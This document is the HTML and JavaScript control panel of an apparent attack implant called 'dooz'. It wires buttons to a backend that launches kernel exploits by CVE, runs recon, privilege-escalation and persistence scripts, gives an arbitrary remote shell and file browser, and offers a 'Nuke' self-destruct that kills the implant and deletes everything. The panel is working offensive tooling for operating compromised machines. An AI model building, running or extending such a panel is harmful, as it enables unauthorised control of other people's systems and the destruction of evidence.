<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>dooz</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a0f;--glass:rgba(255,255,255,0.03);--glass2:rgba(255,255,255,0.06);--border:rgba(255,255,255,0.08);--text:#e4e4e7;--text2:#71717a;--accent:#6366f1;--green:#22c55e;--red:#ef4444;--yellow:#eab308}
body{font-family:-apple-system,system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 20%,rgba(99,102,241,0.08) 0%,transparent 40%),radial-gradient(circle at 80% 80%,rgba(34,197,94,0.05) 0%,transparent 40%);pointer-events:none;z-index:-1}
.c{max-width:1100px;margin:0 auto;padding:20px}
header{display:flex;justify-content:space-between;align-items:center;padding:12px 0;margin-bottom:20px}
.logo{font-size:20px;font-weight:700;background:linear-gradient(135deg,#6366f1,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo span{font-size:10px;color:var(--text2);-webkit-text-fill-color:var(--text2);margin-left:6px}
nav{display:flex;gap:2px;background:var(--glass);backdrop-filter:blur(20px);padding:3px;border-radius:10px;border:1px solid var(--border)}
nav a{color:var(--text2);text-decoration:none;padding:6px 14px;border-radius:7px;font-size:12px;font-weight:500;transition:all .2s;cursor:pointer}
nav a:hover{color:var(--text)}
nav a.on{color:#fff;background:var(--accent)}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.card{background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:12px;padding:16px}
.card.full{grid-column:1/-1}
.card h3{font-size:9px;font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--text2);margin-bottom:12px;display:flex;align-items:center;gap:6px}
.card h3::before{content:'';width:5px;height:5px;background:var(--accent);border-radius:50%}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px}
.stat{background:var(--glass2);padding:10px;border-radius:8px}
.stat-l{font-size:9px;color:var(--text2);text-transform:uppercase;margin-bottom:2px}
.stat-v{font-size:12px;font-weight:600;font-family:monospace;word-break:break-all}
.exp{display:flex;align-items:center;padding:10px 12px;background:var(--glass2);border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:all .2s;margin-bottom:6px}
.exp:hover{background:rgba(99,102,241,0.1);border-color:rgba(99,102,241,0.3)}
.exp:last-child{margin:0}
.exp-cve{font-weight:600;font-size:12px;width:130px;font-family:monospace}
.exp-nm{flex:1;color:var(--text2);font-size:11px}
.exp-rt{font-size:11px;font-weight:600;width:35px;text-align:right}
.exp-bar{width:50px;height:3px;background:var(--glass);border-radius:2px;margin-left:8px}
.exp-bar i{display:block;height:100%;border-radius:2px}
.term{background:#000;border-radius:10px;padding:12px;font-family:monospace;font-size:11px;min-height:180px;max-height:280px;overflow-y:auto}
.term::-webkit-scrollbar{width:4px}
.term::-webkit-scrollbar-thumb{background:var(--glass2);border-radius:2px}
.term pre{margin:3px 0;line-height:1.4;white-space:pre-wrap;word-break:break-all}
.term .cmd{color:var(--accent)}
.term .out{color:var(--green);opacity:0.9}
.irow{display:flex;gap:6px;margin-top:10px}
.irow input{flex:1;background:var(--glass);border:1px solid var(--border);color:var(--text);padding:10px 12px;border-radius:8px;font-family:monospace;font-size:12px;outline:none}
.irow input:focus{border-color:var(--accent)}
.btn{background:var(--accent);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;transition:all .2s}
.btn:hover{filter:brightness(1.1)}
.btn-g{background:var(--glass);border:1px solid var(--border);color:var(--text)}
.btn-r{background:rgba(239,68,68,0.15);color:var(--red);border:1px solid rgba(239,68,68,0.3)}
.btn-y{background:rgba(234,179,8,0.15);color:var(--yellow);border:1px solid rgba(234,179,8,0.3)}
.qs{display:flex;flex-wrap:wrap;gap:4px;margin:8px 0}
.qs span{padding:5px 10px;background:var(--glass2);border:1px solid var(--border);border-radius:5px;font-size:10px;font-family:monospace;color:var(--accent);cursor:pointer}
.qs span:hover{background:rgba(99,102,241,0.15)}
.files{max-height:250px;overflow-y:auto}
.file{display:flex;align-items:center;padding:8px 10px;border-bottom:1px solid var(--border);cursor:pointer;font-size:12px}
.file:hover{background:var(--glass2)}
.file:last-child{border:none}
.file-i{width:24px;text-align:center;margin-right:10px;opacity:0.7}
.file-n{flex:1}
.file-s{font-size:10px;color:var(--text2);font-family:monospace}
.bc{font-size:11px;color:var(--text2);margin-bottom:10px;padding-bottom:10px;border-bottom:1px solid var(--border)}
.bc a{color:var(--accent);text-decoration:none}
.key{background:#000;border-radius:8px;padding:12px;font-family:monospace;font-size:10px;color:var(--accent);word-break:break-all;cursor:pointer;border:1px solid var(--border)}
.page{display:none}
.page.on{display:block}
.acts{display:flex;gap:6px;flex-wrap:wrap}
.ld{display:inline-block;width:12px;height:12px;border:2px solid var(--glass2);border-top-color:var(--accent);border-radius:50%;animation:sp .8s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.st{display:inline-flex;align-items:center;gap:4px;padding:3px 8px;border-radius:4px;font-size:10px;font-weight:500;background:rgba(34,197,94,0.1);color:var(--green)}
.st::before{content:'';width:5px;height:5px;background:var(--green);border-radius:50%}
@media(max-width:768px){.grid{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}}
</style></head>
<body>
<div class="c">
<header>
<div class="logo">dooz<span>v8</span></div>
<nav><a class="on" data-p="main">Main</a><a data-p="exp">Exploits</a><a data-p="scr">Scripts</a><a data-p="files">Files</a><a data-p="term">Terminal</a><a data-p="cfg">Config</a></nav>
</header>
<div id="p-main" class="page on">
<div class="grid">
<div class="card"><h3>System</h3><div class="stats" id="sys"><div class="stat"><div class="stat-v"><span class="ld"></span></div></div></div></div>
<div class="card"><h3>Actions</h3><div class="acts"><button class="btn" onclick="nav('exp')">‚ö° Exploits</button><button class="btn btn-g" onclick="nav('scr')">üìú Scripts</button><button class="btn btn-g" onclick="nav('term')">üíª Shell</button><button class="btn btn-y" onclick="pull()">üîÑ Update</button><button class="btn btn-r" onclick="nuke()">üíÄ Nuke</button></div></div>
<div class="card full"><h3>Exploit Scanner</h3><div id="expp"><span class="ld"></span></div></div>
</div>
</div>
<div id="p-exp" class="page">
<div class="card"><h3>Kernel Exploits</h3><p style="color:var(--text2);font-size:11px;margin-bottom:12px">Execute from local clone ‚Ä¢ In-memory</p><div id="expl"><span class="ld"></span></div></div>
</div>
<div id="p-scr" class="page">
<div class="card"><h3>Scripts</h3>
<div class="qs"><span onclick="setS('scripts/sysinfo.sh')">sysinfo</span><span onclick="setS('scripts/recon.sh')">recon</span><span onclick="setS('scripts/privesc.sh')">privesc</span><span onclick="setS('scripts/persist.sh')">persist</span></div>
<div class="irow"><input id="spath" placeholder="scripts/recon.sh"><button class="btn" onclick="runS()">Run</button></div>
<div class="term" id="sout" style="margin-top:12px;min-height:120px"></div>
</div>
</div>
<div id="p-files" class="page">
<div class="card"><h3>Files</h3><div class="bc" id="bc">/</div><div class="files" id="fls"></div></div>
</div>
<div id="p-term" class="page">
<div class="card"><h3>Shell</h3><div class="term" id="tout"></div><div class="irow"><input id="tcmd" placeholder="command" onkeydown="if(event.key==='Enter')runC()"><button class="btn" onclick="runC()">Run</button></div></div>
</div>
<div id="p-cfg" class="page">
<div class="grid">
<div class="card"><h3>Deploy Key</h3><div class="key" id="dk" onclick="cpK()">%s</div></div>
<div class="card"><h3>Status</h3><div class="stats" style="grid-template-columns:1fr"><div class="stat"><div class="stat-l">Connection</div><div class="stat-v"><span class="st">Online</span></div></div><div class="stat"><div class="stat-l">URL</div><div class="stat-v" id="curl" style="color:var(--accent)">-</div></div></div></div>
</div>
</div>
</div>
<script>
const api=async(e,d={})=>(await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})).json();
const $=s=>document.getElementById(s);
const nav=p=>{document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('nav a').forEach(x=>x.classList.remove('on'));$('p-'+p).classList.add('on');document.querySelector(`nav a[data-p=${p}]`).classList.add('on');if(p==='exp')scan();if(p==='files')ls(cwd);if(p==='cfg')cfg();};
document.querySelectorAll('nav a').forEach(a=>a.onclick=()=>nav(a.dataset.p));
const setS=s=>$('spath').value=s;
const cpK=()=>{navigator.clipboard.writeText($('dk').innerText);$('dk').style.background='rgba(34,197,94,0.2)';setTimeout(()=>$('dk').style.background='',500);};
let cwd='/';
async function init(){
const s=await api('run',{path:'scripts/sysinfo.sh'});
let h='';try{const d=JSON.parse(s.output||'{}');for(const[k,v]of Object.entries(d))h+=`<div class="stat"><div class="stat-l">${k}</div><div class="stat-v">${v}</div></div>`;}catch(e){h=`<div class="stat"><div class="stat-v" style="color:var(--red)">${s.output||'Error'}</div></div>`;}
$('sys').innerHTML=h;scanP();}
async function scanP(){
const r=await api('run',{path:'exploits/gate.sh'});
try{const d=JSON.parse(r.output||'{}');
if(d.exploits?.length){let h='';for(const x of d.exploits.slice(0,3)){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--yellow)':'var(--red)';h+=`<div class="exp" onclick="nav('exp')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
$('expp').innerHTML=h;}else $('expp').innerHTML='<span style="color:var(--text2);font-size:11px">No exploits</span>';}catch(e){$('expp').innerHTML=`<span style="color:var(--red);font-size:11px">${r.output}</span>`;}}
async function scan(){
$('expl').innerHTML='<span class="ld"></span>';
const r=await api('run',{path:'exploits/gate.sh'});
try{const d=JSON.parse(r.output||'{}');
if(d.exploits?.length){let h='';for(const x of d.exploits){const c=x.rate>=80?'var(--green)':x.rate>=50?'var(--yellow)':'var(--red)';h+=`<div class="exp" onclick="runE('${x.cve}')"><span class="exp-cve">${x.cve}</span><span class="exp-nm">${x.name}</span><span class="exp-rt" style="color:${c}">${x.rate}%</span><div class="exp-bar"><i style="width:${x.rate}%;background:${c}"></i></div></div>`;}
$('expl').innerHTML=h;}else $('expl').innerHTML='<span style="color:var(--text2)">No exploits</span>';}catch(e){$('expl').innerHTML=`<span style="color:var(--red)">${r.output}</span>`;}}
async function runE(cve){if(!confirm('Run '+cve+'?'))return;$('expl').innerHTML=`<span class="ld"></span> ${cve}...`;const r=await api('run',{path:'exploits/'+cve+'/run.sh'});alert(r.output||'Done');scan();}
async function runS(){const p=$('spath').value.trim();if(!p)return;$('sout').innerHTML=`<pre class="cmd">$ ${p}</pre><span class="ld"></span>`;const r=await api('run',{path:p});$('sout').innerHTML=`<pre class="cmd">$ ${p}</pre><pre class="out">${r.output||'(empty)'}</pre>`;}
async function ls(p){cwd=p;const d=await api('files',{path:p});let bc=`<a href="#" onclick="ls('/');return false">/</a>`;let acc='';for(const x of p.split('/').filter(Boolean)){acc+='/'+x;bc+=` / <a href="#" onclick="ls('${acc}');return false">${x}</a>`;}$('bc').innerHTML=bc;
let h='';if(p!=='/'){const pr=p.split('/').slice(0,-1).join('/')||'/';h+=`<div class="file" onclick="ls('${pr}')"><div class="file-i">üìÅ</div><div class="file-n">..</div></div>`;}
for(const f of d.files||[]){const np=p==='/'?'/'+f.name:p+'/'+f.name;h+=`<div class="file" onclick="${f.type==='dir'?`ls('${np}')`:'0'}"><div class="file-i">${f.type==='dir'?'üìÅ':'üìÑ'}</div><div class="file-n">${f.name}</div><div class="file-s">${f.size||''}</div></div>`;}
$('fls').innerHTML=h||'<div style="padding:16px;color:var(--text2);text-align:center;font-size:12px">Empty</div>';}
async function runC(){const c=$('tcmd').value.trim();if(!c)return;$('tcmd').value='';$('tout').innerHTML+=`<pre class="cmd">$ ${c}</pre>`;const r=await api('exec',{cmd:c});$('tout').innerHTML+=`<pre class="out">${r.output||''}</pre>`;$('tout').scrollTop=1e9;}
async function cfg(){const r=await api('url');$('curl').innerText=r.url||'-';}
async function pull(){const r=await api('pull');alert('Update: '+(r.output||'Done'));location.reload();}
async function nuke(){if(!confirm('üíÄ DESTRUCT?\n\nKill + Delete all'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;flex-direction:column;gap:12px;background:var(--bg)"><div style="font-size:40px">üíÄ</div><div style="font-size:20px;font-weight:700;color:var(--red)">DESTROYED</div></div>';}
init();ls('/');cfg();
</script>
</body></html>
